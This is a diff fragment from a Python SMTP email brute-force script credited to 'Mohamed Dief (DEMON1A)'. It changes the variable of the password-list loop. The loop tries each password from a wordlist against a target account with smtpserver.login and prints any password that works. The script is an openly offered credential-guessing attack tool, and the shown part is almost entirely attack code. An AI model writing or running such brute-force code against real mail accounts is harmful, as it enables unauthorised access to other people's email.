@@ -106,7 +106,7 @@ print("[*]Start Brute Force!")
 
                                   ###Coded By Mohamed Dief(DEMON1A)###
 
-for Password in pw:
+for Password in PWF:
     try:
         smtpserver.login(Email, Password)
         print("[+]Password Found: {0}".format(Password))
